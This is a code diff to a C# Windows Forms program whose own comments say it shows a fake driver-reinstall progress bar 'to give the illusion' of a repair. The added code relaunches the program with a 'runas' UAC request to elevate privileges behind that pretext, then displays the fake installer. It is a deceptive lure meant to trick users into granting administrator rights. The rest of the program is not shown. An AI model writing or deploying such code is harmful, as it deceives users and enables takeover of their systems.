@@ -5,6 +5,7 @@ using System;
 using System.Drawing;
 using Microsoft.Win32;
 using System.Threading;
+using System.Diagnostics;
 using System.Windows.Forms;
 using System.Drawing.Drawing2D;
 
@@ -117,11 +118,30 @@ public class DiversionPrompt : Form
     // Create a fake progress bar to give the illusion that we are reinstalling
     // the driver and its dependencies
     void ReinstallDriver(object sender, EventArgs e) {
-        Thread t = new Thread(new ThreadStart(InstallerForm));
-        t.Start();
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = Application.ExecutablePath,
+            Arguments = "--repair",
+            Verb = "runas", // triggers UAC to elevate privs
+            UseShellExecute = true
+        };
 
-        // kill diversion prompt so only one form is up at a time for now
-        this.Close();
+        try
+        {
+            Process.Start(psi);
+
+            Thread.Sleep(500);
+
+            Thread t = new Thread(new ThreadStart(InstallerForm));
+            t.Start();
+
+            // kill diversion prompt so only one form is up at a time for now
+            this.Close();
+        } catch
+            {
+                // User probably clicked "No" on the UAC prompt
+                Console.WriteLine("User denied elevation.");
+            }
     }
 
     void InstallerForm() {
